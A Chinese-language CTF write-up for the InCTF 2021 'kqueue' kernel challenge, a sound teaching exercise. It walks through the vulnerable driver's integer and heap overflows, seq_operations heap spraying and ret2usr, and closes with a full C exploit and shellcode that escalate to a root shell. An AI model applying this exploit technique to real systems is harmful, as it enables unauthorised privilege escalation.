@@ -1,0 +1,715 @@
+# InCTF 2021 国际赛 - kqueue 复现及简要分析
+
+阅读量 **184507**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2021-11-11 10:00:28
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p2.ssl.qhimg.com/t0176facc785986a5a3.jpg)
+
+## 0x00.一切开始之前
+
+InCTF 国际赛据称为印度的“强网杯”，比赛时笔者所在的战队没有报名所以未能参加，赛后笔者看到了[Scupax0s 师傅的
+WP](https://bbs.pediy.com/thread-269031.htm)后把其中一道kernel pwn简单复现了一下，感觉还是挺不错的一道
+kernel pwn 入门题
+
+> 原题下载地址在[这里](https://github.com/teambi0s/InCTFi/tree/master/2021/Pwn/Kqueue)，
+>
+> 这道题的文件系统用 Buildroot 进行构建， **登入用户名为 ctf，密码为 kqueue** ，笔者找了半天才在官方 GitHub 里的
+> Admin 中打远程用的脚本找到的这个信息…
+>
+> 还有个原因不明的问题，本地重打包后 **运行根目录下 init 时的 euid 为 1000** ，笔者只好拉一个别的 kernel pwn
+> 的文件系统过来暂时顶用…
+
+## 0x01.题目分析
+
+###  保护分析
+
+查看启动脚本，只开启了 kaslr 保护，没开 KPTI 也没开 smap&smep，还是给了我们 ret2usr 的机会的
+
+    
+    
+    #!/bin/bash
+    
+    exec qemu-system-x86_64 \
+        -cpu kvm64 \
+        -m 512 \
+        -nographic \
+        -kernel "bzImage" \
+        -append "console=ttyS0 panic=-1 pti=off kaslr quiet" \
+        -monitor /dev/null \
+        -initrd "./rootfs.cpio" \
+        -net user \
+        -net nic
+    
+
+###  源码分析
+
+题目给出了源代码，免去了我们逆向的麻烦
+
+在 `kqueue.h` 中只定义了一个 ioctl 函数
+
+    
+    
+    static long kqueue_ioctl(struct file *file, unsigned int cmd, unsigned long arg);
+    static struct file_operations kqueue_fops = {.unlocked_ioctl = kqueue_ioctl};
+    
+
+ioctl 的函数定义位于 `kqueue.c` 中，如下：
+
+    
+    
+    static noinline long kqueue_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
+    
+        long result;
+    
+        request_t request;
+    
+        mutex_lock(&operations_lock);
+    
+        if (copy_from_user((void *)&request, (void *)arg, sizeof(request_t))){
+            err("[-] copy_from_user failed");
+            goto ret;
+        }
+    
+        switch(cmd){
+            case CREATE_KQUEUE:
+                result = create_kqueue(request);
+                break;
+            case DELETE_KQUEUE:
+                result = delete_kqueue(request);
+                break;
+            case EDIT_KQUEUE:
+                result = edit_kqueue(request);
+                break;
+            case SAVE:
+                result = save_kqueue_entries(request);
+                break;
+            default:
+                result = INVALID;
+                break;
+        }
+    ret: 
+        mutex_unlock(&operations_lock);
+        return result;
+    }
+    
+
+我们要传入的结构体应当为 `request_t` 类型，如下：
+
+    
+    
+    typedef struct{
+        uint32_t max_entries;
+        uint16_t data_size;
+        uint16_t entry_idx;
+        uint16_t queue_idx;
+        char* data;
+    }request_t;
+    
+
+在 ioctl 中定义了比较经典的增删改查操纵，下面逐个分析
+
+***err**
+
+笔者发现在其定义的一系列函数当中都有一系列的检查，若检查不通过则会调用 `err` 函数，如下：
+
+    
+    
+    static long err(char* msg){
+        printk(KERN_ALERT "%s\n",msg);
+        return -1;
+    }
+    
+
+也就是说 **所有的检查没有任何的实际意义，哪怕不通过检查也不会阻碍程序的运行** ，经笔者实测确乎如此
+
+**create_kqueue**
+
+主要是进行队列的创建，限制了队列数量与大小
+
+    
+    
+    static noinline long create_kqueue(request_t request){
+        long result = INVALID;
+    
+        if(queueCount > MAX_QUEUES)
+            err("[-] Max queue count reached");
+    
+        /* You can't ask for 0 queues , how meaningless */
+        if(request.max_entries<1)
+            err("[-] kqueue entries should be greater than 0");
+    
+        /* Asking for too much is also not good */
+        if(request.data_size>MAX_DATA_SIZE)
+            err("[-] kqueue data size exceed");
+    
+        /* Initialize kqueue_entry structure */
+        queue_entry *kqueue_entry;
+    
+        /* Check if multiplication of 2 64 bit integers results in overflow */
+        ull space = 0;
+        if(__builtin_umulll_overflow(sizeof(queue_entry),(request.max_entries+1),&space) == true)
+            err("[-] Integer overflow");
+    
+        /* Size is the size of queue structure + size of entry * request entries */
+        ull queue_size = 0;
+        if(__builtin_saddll_overflow(sizeof(queue),space,&queue_size) == true)
+            err("[-] Integer overflow");
+    
+        /* Total size should not exceed a certain limit */
+        if(queue_size>sizeof(queue) + 0x10000)
+            err("[-] Max kqueue alloc limit reached");
+    
+        /* All checks done , now call kzalloc */
+        queue *queue = validate((char *)kmalloc(queue_size,GFP_KERNEL));
+    
+        /* Main queue can also store data */
+        queue->data = validate((char *)kmalloc(request.data_size,GFP_KERNEL));
+    
+        /* Fill the remaining queue structure */
+        queue->data_size   = request.data_size;
+        queue->max_entries = request.max_entries;
+        queue->queue_size  = queue_size;
+    
+        /* Get to the place from where memory has to be handled */
+        kqueue_entry = (queue_entry *)((uint64_t)(queue + (sizeof(queue)+1)/8));
+    
+        /* Allocate all kqueue entries */
+        queue_entry* current_entry = kqueue_entry;
+        queue_entry* prev_entry = current_entry;
+    
+        uint32_t i=1;
+        for(i=1;i<request.max_entries+1;i++){
+            if(i!=request.max_entries)
+                prev_entry->next = NULL;
+            current_entry->idx = i;
+            current_entry->data = (char *)(validate((char *)kmalloc(request.data_size,GFP_KERNEL)));
+    
+            /* Increment current_entry by size of queue_entry */
+            current_entry += sizeof(queue_entry)/16;
+    
+            /* Populate next pointer of the previous entry */
+            prev_entry->next = current_entry;
+            prev_entry = prev_entry->next;
+        }
+    
+        /* Find an appropriate slot in kqueues */
+        uint32_t j = 0;
+        for(j=0;j<MAX_QUEUES;j++){
+            if(kqueues[j] == NULL)
+                break;
+        }
+    
+        if(j>MAX_QUEUES)
+            err("[-] No kqueue slot left");
+    
+        /* Assign the newly created kqueue to the kqueues */
+        kqueues[j] = queue;
+        queueCount++;
+        result = 0;
+        return result;
+    }
+    
+
+其中一个 queue 结构体定义如下，大小为 0x18：
+
+    
+    
+    typedef struct{
+        uint16_t data_size;
+        uint64_t queue_size; /* This needs to handle larger numbers */
+        uint32_t max_entries;
+        uint16_t idx;
+        char* data;
+    }queue;
+    
+
+我们有一个全局指针数组保存分配的 queue
+
+    
+    
+    queue *kqueues[MAX_QUEUES] = {(queue *)NULL};
+    
+
+在这里用到了 [gcc 内置函数](https://gcc.gnu.org/onlinedocs/gcc/Integer-Overflow-Builtins.html) `__builtin_umulll_overflow`，主要作用就是将前两个参数相乘给到第三个参数，发生溢出则返回
+true，`__builtin_saddll_overflow` 与之类似不过是加法
+
+那么这里虽然 queue 结构体的成员数量似乎是固定的，但是在 kmalloc 时传入的 size 为 `((request.max_entry + 1)
+* sizeof(queue_entry)) + sizeof(queue)`，其剩余的空间用作 queue_entry 结构体，定义如下：
+
+    
+    
+    struct queue_entry{
+        uint16_t idx;
+        char *data;
+        queue_entry *next;
+    };
+    
+
+在这里存在一个 **整型溢出漏洞** ：如果在
+`__builtin_umulll_overflow(sizeof(queue_entry),(request.max_entries+1),&space)`
+中我们传入的 `request.max_entries` 为 `0xffffffff`，加一后变为0，此时便能通过检测，但 space
+最终的结果为0，从而在后续进行 kmalloc 时便只分配了一个 queue 的大小，但是存放到 queue 的 max_entries 域的值为
+`request.max_entries`
+
+    
+    
+        queue->data_size   = request.data_size;
+        queue->max_entries = request.max_entries;
+        queue->queue_size  = queue_size;
+    
+
+这里有一个移动指针的代码看得笔者比较疑惑，因为在笔者看来可以直接写作 `(queue_entry *)(queue + 1)`，
+~~不过阿三的代码懂的都懂~~
+
+    
+    
+    kqueue_entry = (queue_entry *)((uint64_t)(queue + (sizeof(queue)+1)/8));
+    
+
+在分配 queue->data 时给 kmalloc 传入的大小为 `request.data_size`，限制为 0x20
+
+    
+    
+    queue->data = validate((char *)kmalloc(request.data_size,GFP_KERNEL));
+    
+
+接下来会为每一个 queue_entry 的 data 域都分配一块内存，大小为 `request.data_size`，且 queue_entry
+从低地址向高地址连接成一个单向链表
+
+    
+    
+    uint32_t i=1;
+        for(i=1;i<request.max_entries+1;i++){
+            if(i!=request.max_entries)
+                prev_entry->next = NULL;
+            current_entry->idx = i;
+            current_entry->data = (char *)(validate((char *)kmalloc(request.data_size,GFP_KERNEL)));
+    
+            /* Increment current_entry by size of queue_entry */
+            current_entry += sizeof(queue_entry)/16;
+    
+            /* Populate next pointer of the previous entry */
+            prev_entry->next = current_entry;
+            prev_entry = prev_entry->next;
+        }
+    
+
+在最后会在 kqueue 数组中找一个空的位置把分配的 queue 指针放进去
+
+    
+    
+        uint32_t j = 0;
+        for(j=0;j<MAX_QUEUES;j++){
+            if(kqueues[j] == NULL)
+                break;
+        }
+    
+        if(j>MAX_QUEUES)
+            err("[-] No kqueue slot left");
+    
+        /* Assign the newly created kqueue to the kqueues */
+        kqueues[j] = queue;
+        queueCount++;
+        result = 0;
+        return result;
+    
+
+**delete_kqueue**
+
+常规的删除功能，不过这里有个 bug 是先释放后再清零，笔者认为会把 free object 的next 指针给清掉，有可能导致内存泄漏？
+
+    
+    
+    static noinline long delete_kqueue(request_t request){
+        /* Check for out of bounds requests */
+        if(request.queue_idx>MAX_QUEUES)
+            err("[-] Invalid idx");
+    
+        /* Check for existence of the request kqueue */
+        queue *queue = kqueues[request.queue_idx];
+        if(!queue)
+            err("[-] Requested kqueue does not exist");
+    
+        kfree(queue);
+        memset(queue,0,queue->queue_size);
+        kqueues[request.queue_idx] = NULL;
+        return 0;
+    }
+    
+
+**edit_kqueue**
+
+主要是从用户空间拷贝数据到指定 queue_entry->size，如果给的 entry_idx为 0 则拷到 queue->data
+
+    
+    
+    static noinline long edit_kqueue(request_t request){
+        /* Check the idx of the kqueue */
+        if(request.queue_idx > MAX_QUEUES)
+            err("[-] Invalid kqueue idx");
+    
+        /* Check if the kqueue exists at that idx */
+        queue *queue = kqueues[request.queue_idx];
+        if(!queue)
+            err("[-] kqueue does not exist");
+    
+        /* Check the idx of the kqueue entry */
+        if(request.entry_idx > queue->max_entries)
+            err("[-] Invalid kqueue entry_idx");
+    
+        /* Get to the kqueue entry memory */
+        queue_entry *kqueue_entry = (queue_entry *)(queue + (sizeof(queue)+1)/8);
+    
+        /* Check for the existence of the kqueue entry */
+        exists = false;
+        uint32_t i=1;
+        for(i=1;i<queue->max_entries+1;i++){
+    
+            /* If kqueue entry found , do the necessary */
+            if(kqueue_entry && request.data && queue->data_size){
+                if(kqueue_entry->idx == request.entry_idx){
+                    validate(memcpy(kqueue_entry->data,request.data,queue->data_size));
+                    exists = true;
+                }
+            }
+            kqueue_entry = kqueue_entry->next;
+        }
+    
+        /* What if the idx is 0, it means we have to update the main kqueue's data */
+        if(request.entry_idx==0 && kqueue_entry && request.data && queue->data_size){
+            validate(memcpy(queue->data,request.data,queue->data_size));
+            return 0;
+        }
+    
+        if(!exists)
+            return NOT_EXISTS;
+        return 0;
+    }
+    
+
+**save_kqueue_entries**
+
+这个功能主要是分配一块现有 `queue->queue_size` 大小的 object 然后把 queue->data 与其所有
+queue_entries->data 的内容拷贝到上边，而其每次拷贝的字节数用的是我们传入的 `request.data_size`
+，在这里很明显存在堆溢出
+
+    
+    
+    static noinline long save_kqueue_entries(request_t request){
+    
+        /* Check for out of bounds queue_idx requests */
+        if(request.queue_idx > MAX_QUEUES)
+            err("[-] Invalid kqueue idx");
+    
+        /* Check if queue is already saved or not */
+        if(isSaved[request.queue_idx]==true)
+            err("[-] Queue already saved");
+    
+        queue *queue = validate(kqueues[request.queue_idx]);
+    
+        /* Check if number of requested entries exceed the existing entries */
+        if(request.max_entries < 1 || request.max_entries > queue->max_entries)
+            err("[-] Invalid entry count");
+    
+        /* Allocate memory for the kqueue to be saved */
+        char *new_queue = validate((char *)kzalloc(queue->queue_size,GFP_KERNEL));
+    
+        /* Each saved entry can have its own size */
+        if(request.data_size > queue->queue_size)
+            err("[-] Entry size limit exceed");
+    
+        /* Copy main's queue's data */
+        if(queue->data && request.data_size)
+            validate(memcpy(new_queue,queue->data,request.data_size));
+        else
+            err("[-] Internal error");
+        new_queue += queue->data_size;
+    
+        /* Get to the entries of the kqueue */
+        queue_entry *kqueue_entry = (queue_entry *)(queue + (sizeof(queue)+1)/8);
+    
+        /* copy all possible kqueue entries */
+        uint32_t i=0;
+        for(i=1;i<request.max_entries+1;i++){
+            if(!kqueue_entry || !kqueue_entry->data)
+                break;
+            if(kqueue_entry->data && request.data_size)
+                validate(memcpy(new_queue,kqueue_entry->data,request.data_size));
+            else
+                err("[-] Internal error");
+            kqueue_entry = kqueue_entry->next;
+            new_queue += queue->data_size;
+        }
+    
+        /* Mark the queue as saved */
+        isSaved[request.queue_idx] = true;
+        return 0;
+    }
+    
+
+这里有个全局数组标识一个 queue 是否 saved 了
+
+    
+    
+    bool isSaved[MAX_QUEUES] = {false};
+    
+
+## 0x02.漏洞利用
+
+###  Step I.整数溢出
+
+考虑到在 create_queue 中使用 `request.max_entries + 1` 来进行判定，因此我们可以传入 0xffffffff
+使得其只分配一个 queue 和一个 data 而不分配 queue_entry的同时使得 `queue->max_entries =
+0xffffffff`，此时我们的 queue->queue_size 便为 0x18
+
+###  Step II.堆溢出 + 堆喷射覆写 seq_operations 控制内核执行流
+
+前面我们说到在 save_kqueue_entries() 中存在着堆溢出，而在该函数中分配的 object 大小为 queue->queue_size，即
+0x18，应当从 `kmalloc-32` 中取，那么我们来考虑在该 slab 中可用的结构体
+
+不难想到的是， **seq_operations** 这个结构体同样从 `kmalloc-32` 中分配，当我们打开一个 stat 文件时（如
+`/proc/self/stat` ）便会在内核空间中分配一个 seq_operations 结构体，该结构体定义于
+`/include/linux/seq_file.h` 当中，只定义了四个函数指针，如下：
+
+    
+    
+    struct seq_operations {
+        void * (*start) (struct seq_file *m, loff_t *pos);
+        void (*stop) (struct seq_file *m, void *v);
+        void * (*next) (struct seq_file *m, void *v, loff_t *pos);
+        int (*show) (struct seq_file *m, void *v);
+    };
+    
+
+当我们 read 一个 stat 文件时，内核会调用其 proc_ops 的 `proc_read_iter` 指针，其默认值为
+`seq_read_iter()` 函数，定义于 `fs/seq_file.c` 中，注意到有如下逻辑：
+
+    
+    
+    ssize_t seq_read_iter(struct kiocb *iocb, struct iov_iter *iter)
+    {
+        struct seq_file *m = iocb->ki_filp->private_data;
+        //...
+        p = m->op->start(m, &m->index);
+        //...
+    
+
+即其会调用 seq_operations 中的 start 函数指针，那么 **我们只需要控制 seq_operations- >start 后再读取对应
+stat 文件便能控制内核执行流**
+
+我们可以使用 **堆喷射** （heap spray）的手法在内核空间喷射足够多的 seq_operations 结构体从而保证我们能够溢出到其中之一
+
+###  Step III.ret2usr + ret2shellcode
+
+由于没有开启 smep、smap、kpti，故 ret2usr 的攻击手法在本题中是可行的，但是由于开启了 kaslr 的缘故，我们并不知道
+prepare_kernel_cred 和 commit_creds 的地址，似乎无法直接执行
+`commit_creds(prepare_kernel_cred(NULL))`
+
+这里 ScuPax0s 师傅给出了一个美妙的解法：通过编写 **shellcode**
+在内核栈上找恰当的数据以获得内核基址，执行`commit_creds(prepare_kernel_cred(NULL))` 并返回到用户态
+
+###  Final Exploit
+
+故最终的 exp 如下：
+
+    
+    
+    #define _GNU_SOURCE
+    #include <stdlib.h>
+    #include <stdio.h>
+    #include <stdint.h>
+    #include <string.h>
+    #include <fcntl.h>
+    #include <unistd.h>
+    
+    #include <sys/types.h>
+    #include <sys/ioctl.h>
+    #include <sys/prctl.h>
+    #include <sys/syscall.h>
+    #include <sys/mman.h>
+    #include <sys/stat.h>
+    
+    typedef struct
+    {
+        uint32_t    max_entries;
+        uint16_t    data_size;
+        uint16_t    entry_idx;
+        uint16_t    queue_idx;
+        char*       data;
+    }request_t;
+    
+    long dev_fd;
+    size_t root_rip;
+    
+    size_t user_cs, user_ss, user_rflags, user_sp;
+    void saveStatus(void)
+    {
+        __asm__("mov user_cs, cs;"
+                "mov user_ss, ss;"
+                "mov user_sp, rsp;"
+                "pushf;"
+                "pop user_rflags;"
+                );
+        printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
+    }
+    
+    void getRootShell(void)
+    {   
+        puts("\033[32m\033[1m[+] Backing from the kernelspace.\033[0m");
+    
+        if(getuid())
+        {
+            puts("\033[31m\033[1m[x] Failed to get the root!\033[0m");
+            exit(-1);
+        }
+    
+        puts("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m");
+        system("/bin/sh");
+        exit(0);// to exit the process normally instead of segmentation fault
+    }
+    
+    void errExit(char * msg)
+    {
+        printf("\033[31m\033[1m[x] Error: \033[0m%s\n", msg);
+        exit(EXIT_FAILURE);
+    }
+    
+    void createQueue(uint32_t max_entries, uint16_t data_size)
+    {
+        request_t req = 
+        {
+            .max_entries    = max_entries,
+            .data_size      = data_size,
+        };
+        ioctl(dev_fd, 0xDEADC0DE, &req);
+    }
+    
+    void editQueue(uint16_t queue_idx,uint16_t entry_idx,char *data)
+    {
+        request_t req =
+        {
+            .queue_idx  = queue_idx,
+            .entry_idx  = entry_idx,
+            .data       = data,
+        };
+        ioctl(dev_fd, 0xDAADEEEE, &req);
+    }
+    
+    void deleteQueue(uint16_t queue_idx)
+    {
+        request_t req = 
+        {
+            .queue_idx = queue_idx,
+        };
+        ioctl(dev_fd, 0xBADDCAFE, &req);
+    }
+    
+    void saveQueue(uint16_t queue_idx,uint32_t max_entries,uint16_t data_size)
+    {
+        request_t req =
+        {
+            .queue_idx      = queue_idx,
+            .max_entries    = max_entries,
+            .data_size      = data_size,
+        };
+        ioctl(dev_fd, 0xB105BABE, &req);
+    }
+    
+    void shellcode(void)
+    {
+        __asm__(
+            "mov r12, [rsp + 0x8];"
+            "sub r12, 0x201179;"
+            "mov r13, r12;"
+            "add r12, 0x8c580;"  // prepare_kernel_cred
+            "add r13, 0x8c140;"  // commit_creds
+            "xor rdi, rdi;"
+            "call r12;"
+            "mov rdi, rax;"
+            "call r13;"
+            "swapgs;"
+            "mov r14, user_ss;"
+            "push r14;"
+            "mov r14, user_sp;"
+            "push r14;"
+            "mov r14, user_rflags;"
+            "push r14;"
+            "mov r14, user_cs;"
+            "push r14;"
+            "mov r14, root_rip;"
+            "push r14;"
+            "iretq;"
+        );
+    }
+    
+    int main(int argc, char **argv, char**envp)
+    {
+        long        seq_fd[0x200];
+        size_t      *page;
+        size_t      data[0x20];
+    
+        saveStatus();
+        root_rip = (size_t) getRootShell;
+        dev_fd = open("/dev/kqueue", O_RDONLY);
+        if (dev_fd < 0)
+            errExit("FAILED to open the dev!");
+    
+        for (int i = 0; i < 0x20; i++)
+            data[i] = (size_t) shellcode;
+    
+        createQueue(0xffffffff, 0x20 * 8);
+        editQueue(0, 0, data);
+        for (int i = 0; i < 0x200; i++)
+            seq_fd[i] = open("/proc/self/stat", O_RDONLY);
+        saveQueue(0, 0, 0x40);
+        for (int i = 0; i < 0x200; i++)
+            read(seq_fd[i], data, 1);
+    }
+    
+
+运行即可提权到 root
+
+![](https://p0.ssl.qhimg.com/t010fa1cf20a1870822.png)
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **墨晚鸢** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/258160](/post/id/258160)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [linux](/tag/linux)
+  * [Pwn](/tag/Pwn)
+  * [Kernel](/tag/Kernel)
+
+ **+1** __2赞
+
+ __收藏
+
+![](https://p3.ssl.qhimg.com/t0148f718bec9e27586.png) 墨晚鸢
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
